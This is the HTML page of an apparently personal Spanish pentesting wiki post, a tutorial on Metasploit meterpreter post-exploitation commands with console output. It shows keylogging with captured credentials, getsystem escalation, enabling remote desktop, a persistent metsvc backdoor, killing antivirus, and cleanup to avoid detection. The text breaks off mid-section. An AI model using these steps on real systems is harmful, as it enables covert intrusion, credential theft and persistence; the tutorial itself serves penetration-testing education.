@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='background Permite establecer el proceso de la consola meterpreter a un proceso “demonio” con lo que posteriormente permitirá volver al contexto de ejecución anterior a la obtención de la consola, eventualmente se puede volver a activar este proceso por medio del comando sesión:
+meterpreter &amp;gt; background
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 msf exploit(handler) &amp;gt; sessions -l Active sessions =============== Id Type Information Connection 1 meterpreter x86/win32 OWNER\Owner @ OWNER 192.'><title>meterpreter</title>
+
+<link rel='canonical' href='https://www.procamora.com/p/meterpreter/'>
+
+<link rel="stylesheet" href="/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css"><meta property='og:title' content='meterpreter'>
+<meta property='og:description' content='background Permite establecer el proceso de la consola meterpreter a un proceso “demonio” con lo que posteriormente permitirá volver al contexto de ejecución anterior a la obtención de la consola, eventualmente se puede volver a activar este proceso por medio del comando sesión:
+meterpreter &amp;gt; background
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 msf exploit(handler) &amp;gt; sessions -l Active sessions =============== Id Type Information Connection 1 meterpreter x86/win32 OWNER\Owner @ OWNER 192.'>
+<meta property='og:url' content='https://www.procamora.com/p/meterpreter/'>
+<meta property='og:site_name' content='#&gt; fireroot'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='meterpreter' /><meta property='article:published_time' content='2015-09-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2015-09-08T00:00:00&#43;00:00'/><meta property='og:image' content='https://www.procamora.com/covers/pentesting.png' />
+<meta name="twitter:title" content="meterpreter">
+<meta name="twitter:description" content="background Permite establecer el proceso de la consola meterpreter a un proceso “demonio” con lo que posteriormente permitirá volver al contexto de ejecución anterior a la obtención de la consola, eventualmente se puede volver a activar este proceso por medio del comando sesión:
+meterpreter &amp;gt; background
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 msf exploit(handler) &amp;gt; sessions -l Active sessions =============== Id Type Information Connection 1 meterpreter x86/win32 OWNER\Owner @ OWNER 192."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://www.procamora.com/covers/pentesting.png' />
+    <link rel="shortcut icon" href="img/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/icons/procamora_30_hua3d16f4d7ffad1a52a64c31db4447108_16949_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">#&gt; fireroot</a></h1>
+            <h2 class="site-description">Mi wiki donde escribo artículos sobre Linux, Ciberseguridad y temas relacionados.</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/procamora'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:pablojoserocamora@gmail.com'
+                        target="_blank"
+                        title="Gmail"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-gmail" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"/> <path d="M16 20h3a1 1 0 0 0 1 -1v-14a1 1 0 0 0 -1 -1h-3v16z" /> <path d="M5 20h3v-16h-3a1 1 0 0 0 -1 1v14a1 1 0 0 0 1 1z" /> <path d="M16 4l-4 4l-4 -4" /> <path d="M4 6.5l8 7.5l8 -7.5" /> </svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://es.linkedin.com/in/pablo-rocamora'
+                        target="_blank"
+                        title="Linkedin"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"/> <rect x="4" y="4" width="16" height="16" rx="2" /> <line x1="8" y1="11" x2="8" y2="16" /> <line x1="8" y1="8" x2="8" y2="8.01" /> <line x1="12" y1="16" x2="12" y2="11" /> <path d="M16 16v-3a2 2 0 0 0 -4 0" /> </svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archivos</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Buscar</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/acerca-de/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>Acerca de</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/index.xml' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="5" cy="19" r="1" />
+  <path d="M4 4a16 16 0 0 1 16 16" />
+  <path d="M4 11a9 9 0 0 1 9 9" />
+</svg>
+
+
+
+                
+                <span>Feed</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://www.procamora.com/" selected>Español</option>
+                        
+                            <option value="https://www.procamora.com/en/" >English</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Modo oscuro</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/meterpreter/">
+                
+                    <img src="/covers/pentesting.png" loading="lazy" alt="Featured image of post meterpreter" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pentesting/" >
+                Pentesting
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/meterpreter/">meterpreter</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 08, 2015</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    11 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+
+    <div class="article-category">
+        
+            
+                
+            
+            
+                <a href='https://github.com/procamora/dummy/edit/main/content/post/Pentesting/meterpreter.md' style="background-color: #5bc0de" >Edit this page on GitHub</a>
+            
+            
+                <a href='https://github.com/procamora/dummy/edit/main/content/post/Pentesting/meterpreter.md' style="background-color: #5bc0de" >Download article PDF</a>
+            
+        
+    </div>
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>background <Core>
+Permite establecer el proceso de la consola meterpreter a un proceso “demonio” con lo que posteriormente permitirá volver al contexto de ejecución anterior a la obtención de la consola, eventualmente se puede volver a activar este proceso por medio del comando sesión:</p>
+<p><code>meterpreter &gt; background</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msf exploit(handler) &gt; sessions -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Active sessions
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">===============
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Id Type Information Connection
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1 meterpreter x86/win32 OWNER\Owner @ OWNER 192.168.1.33:443 -&gt; 192.168.1.34:1091
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf exploit(handler) &gt; sessions -i 1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[\*] Starting interaction with 1…
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>keyscan <Stdapi User Interface Commands>
+Con esta utilidad es posible saber que ha digitado el usuario en su maquina, de esta se obtiene fácilmente, claves, usuarios, direcciones, mensajes, etc.</p>
+<p>Su uso:</p>
+<p>meterpreter &gt; keyscan_start</p>
+<p>Starting the keystroke sniffer…</p>
+<p>Con esto se ha iniciado el keylogger, posteriormente para consultar lo que se digitado:
+meterpreter &gt; keyscan_dump</p>
+<p>Dumping captured keystrokes…</p>
+<p><Ctrl> <LCtrl> t <Ctrl> <LCtrl> l <Esc> gmail.com <Return> usuario<Tab> passSuperSegura <Return></p>
+<p>Finalmente para detener el servicio basta con:</p>
+<p>meterpreter &gt; keyscan_stop</p>
+<p>Stopping the keystroke sniffer…</p>
+<p>getuid <Stdapi System Commands>, getsystem &lt;Priv: Elevate Commands&gt; y rev2self <stdapi System Commands>
+Con estos comandos se pueden hacer operaciones de consulta y manipulación de cuentas de usuarios</p>
+<h5 id="para-obtener-el-usuario-en-sesión">Para obtener el usuario en sesión</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">&gt;</span><span class="w"> </span><span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">`</span><span class="n">getuid</span><span class="o">`</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Server</span><span class="w"> </span><span class="n">username</span><span class="p">:</span><span class="w"> </span><span class="n">OWNER</span><span class="err">\</span><span class="n">Owner</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="para-obtener-la-cuenta-del-usuario-system">Para obtener la cuenta del usuario SYSTEM</h5>
+<p>meterpreter &gt; getsystem</p>
+<h5 id="got-system-via-technique-1">got system (via technique 1).</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getuid
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Server username: NT AUTHORITY\SYSTEM
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="para-volver-a-la-sesión-anterior">Para volver a la sesión anterior</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; rev2self
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; getuid
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Server username: OWNER\Owner
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>migrate <Core>
+Permite migrar el proceso de Meterpreter a otro proceso activo, su uso es muy simple basta con especificar un PID activo (que puede ser consultado utilizando el comando “ps” de Meterpreter).</p>
+<p>meterpreter &gt; migrate 1780</p>
+<p>De esta forma, cuando se cierre el proceso en ejecución anteriormente asociado al proceso de Meterpreter, este será “migrado” al proceso especificado, se recomienda que el PID sea el de el proceso explorer.exe o uno que tenga relación con los procesos del sistema operativo.</p>
+<p>getgui
+Con este comando es posible acceder al escritorio remoto de la maquina objetivo, en concreto, lo que permite este comando es activar el escritorio remoto de la maquina comprometida.</p>
+<p>Su uso resulta muy sencillo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; run getgui -e
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Carlos Perez carlos_perez@darkoperator.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Enabling Remote Desktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] RDP is disabled; enabling it …
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Setting Terminal Services service startup mode
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] The Terminal Services service is not set to auto, changing it to auto …
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Opening port in local firewall if necessary
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] For cleanup use command: run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up__20110307.0914.rc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="posteriormente-podemos-conectarnos-al-escritorio-remoto-usando-el-comando-rdesktop-con-una-sintaxis-similar-al-siguiente">Posteriormente podemos conectarnos al escritorio remoto usando el comando rdesktop con una sintaxis similar al siguiente:</h5>
+<p><code>rdesktop -u juan -p juan 192.168.1.34</code></p>
+<p>Cabe notar que el usuario y el password especificados pueden corresponder a un usuario creado anteriormente con incógnito, aunque evidentemente se puede utilizar cualquier otro usuario con credenciales validas.</p>
+<p>Nota: En sistemas operativos XP y otros que no soporten múltiples sesiones de escritorio remoto, esta acción hará que el usuario logueado en la maquina remota pierda su sesión, por ende es necesario tener prudencia con este tipo de acciones, principalmente para no alertar al usuario sobre las acciones que se están llevando a cabo, esto también aplica a la creación de usuarios, dado que es bastante notorio cuando un usuario se ha creado en el sistema.</p>
+<h5 id="finalmente-se-limpia-lo-que-se-ha-hecho-para-no-dejar-rastros-para-esto-se-utiliza-el-comando">Finalmente, se limpia lo que se ha hecho para no dejar rastros, para esto se utiliza el comando:</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up__20110307.0914.rc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Running Command List …
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Running command reg setval -k ‘HKLM\System\CurrentControlSet\Control\Terminal Server’ -v ‘fDenyTSConnections’ -d &#34;1&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Successful set fDenyTSConnections.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Running command execute -H -f cmd.exe -a “/c sc config termservice start= disabled”
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Process 580 created.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Running command execute -H -f cmd.exe -a “/c sc stop termservice”
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Process 3184 created.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Running command execute -H -f cmd.exe -a “/c ‘netsh firewall set service type = remotedesktop mode = enable’”
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Process 1312 created.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>metsvc
+Permite definir un proceso persistente en la maquina objetivo que se encontrará a la espera de una nueva conexión por parte del atacante, para esto será necesario en primer lugar “migrar” el proceso de la sesión meterpreter actual a otro proceso “persistente” del objetivo, del modo en el que se ha indicando anteriormente con el comando migrate, por este motivo los procesos que resultan mas interesantes son aquellos propios del sistema operativo, posteriormente se puede ejecutar:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; run metsvc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Creating a meterpreter service on port 31337
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Creating a temporary installation directory C:\DOCUME~1\Owner\LOCALS~1\Temp\lZBdswMe…
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] &gt;&gt; Uploading metsrv.dll…
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] &gt;&gt; Uploading metsvc-server.exe…
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] &gt;&gt; Uploading metsvc.exe…
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Starting the service…
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Installing service metsvc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Starting service
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service metsvc successfully installed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Como se puede apreciar la backdoor se ha instalado correctamente en el objetivo, ahora es posible realizar una conexión activa (ya no es necesario esperar de forma pasiva a que un usuario ejecute el fichero .exe que habilitará la sesión meterpreter).</p>
+<p>killav</p>
+<h5 id="en-muchas-ocasiones-en-la-maquina-objetivo-existen-programas-de-antivirus-instalados-lo-que-dificultará-tareas-comunes-e-inclusive-triviales-por-esta-razón-existe-el-script-killav-que-intentará-terminar-todos-los-procesos-de-antivirus-en-el-objetivo">En muchas ocasiones en la maquina objetivo existen programas de antivirus instalados, lo que dificultará tareas comunes e inclusive triviales, por esta razón existe el script killav que intentará terminar todos los procesos de antivirus en el objetivo:</h5>
+<p>meterpreter &gt; run killav</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] Killing Antivirus services on the target…
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Killing off avgrsx.exe…
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Aunque con este comando se supone que se deberían eliminar los procesos de monitoreo como Antivirus, en algunos casos no funciona correctamente, en especial cuando se trata de antivirus que tienen procesos persistentes/resilentes y que no pueden ser detenidos con los mecanismos convencionales, es en estos casos en los que se deben emplear mecanismos mas elaborados para desactivar esta clase de servicios en la maquina comprometida, aquí entra en juego un proceso de recolección de información y análisis de las defensas del objetivo.</p>
+<p>route <Stdapi Network commands>
+Se trata del conocido comando route en sistemas windows/linux, permite conocer y definir las tablas de enrutamiento del sistema</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; route list
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Network routes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">==============
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Subnet Netmask Gateway
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">—— ——- ——-
+</span></span><span class="line"><span class="cl">
